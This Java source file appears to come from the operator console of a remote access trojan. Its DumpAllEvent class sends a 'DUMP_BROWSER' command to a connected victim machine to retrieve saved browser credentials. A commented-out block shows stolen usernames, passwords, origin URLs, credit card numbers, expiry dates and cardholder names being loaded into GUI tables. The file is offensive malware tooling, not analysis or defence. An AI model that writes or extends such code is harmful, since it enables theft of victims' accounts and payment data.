package GUI.TableUtils.Credentials.Events;

import Connections.BytesChannel;
import Connections.Category;
import GUI.TableUtils.Credentials.CredentialsManagerGUI;
import Information.AbstractEvent;
import org.json.JSONObject;

import java.io.IOException;

public class DumpAllEvent extends AbstractEvent<CredentialsManagerGUI> {


    public DumpAllEvent(CredentialsManagerGUI guiManager) {
        super(guiManager);
    }

    @Override
    public void run() {
        BytesChannel bytesChannel = getClient().createFileChannel(Category.BROWSER_CREDENTIALS);
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("ACTION", "DUMP_BROWSER");
        jsonObject.put("channel_id", bytesChannel.getId());
        try {
            getClient().sendString(jsonObject.toString());
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

        /* try {
           String nameOfSession = credentialsManagerGUI.getClientHandler().getSessionFolder() + "/" + "/Browser Credentials/" + new Time().getTime();
            CombinedCredentials combinedCredentials = credentialsManagerGUI.getStream().getCredentials(Action.DUMP_CREDENTIALS, nameOfSession);
            ArrayList<AccountCredentials> accountCredentials = (ArrayList<AccountCredentials>) combinedCredentials.accountCredentials();
            ArrayList<CreditCardCredentials> creditCardCredentials = (ArrayList<CreditCardCredentials>) combinedCredentials.creditCardCredentials();
            SwingUtilities.invokeLater(() -> {
                for (AccountCredentials e : accountCredentials) {
                    Object[] elements = {e.actionUrl(), e.originUrl(), e.username(), e.password(), e.creationDate(), e.lastUsedDate()};
                    credentialsManagerGUI.getAccountsTableModel().addRow(elements);
                }
                for (CreditCardCredentials e : creditCardCredentials) {
                    Object[] elements = {e.creditCardNumber(), e.expirationMonth(), e.expirationYear(), e.cardHolder()};
                    credentialsManagerGUI.getCreditCardsTableModel().addRow(elements);
                }
                credentialsManagerGUI.getDumpAllJButton().setEnabled(true);
            });

        } catch (IOException e) {
          //  new ClientErrorHandler("Unable to open message box, connection lost with client",
            //credentialsManagerGUI.getCredentialsManagerDialog(),
             //       credentialsManagerGUI.getStream().getClientSocket());
        }*/
    }
}
